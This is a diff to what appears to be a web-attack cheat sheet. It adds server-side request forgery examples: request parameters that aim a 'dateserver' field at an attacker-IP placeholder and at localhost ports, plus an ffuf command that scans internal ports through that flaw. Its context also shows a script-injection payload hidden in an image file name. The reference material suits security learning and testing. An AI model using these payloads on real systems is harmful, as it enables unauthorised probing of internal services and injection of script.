@@ -899,6 +899,13 @@ file<script>alert(window.origin);</script>.jpg
 
 *Allows an attacker to cause the server-side application to make requests to an unintended location.*
 
+```
+dateserver=http://<Attacker IP address>:<port>&date=2024-01-01
+dateserver=http://127.0.0.1:8080&date=2024-01-01
+dateserver=http://127.0.0.1:81&date=2024-01-01
+$  ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
+```
+
 - Server-Side Template Injection (SSTI)
 
 *Allows an attacker to use native template syntax to inject a malicious payload into a template, which is then executed server-side.*
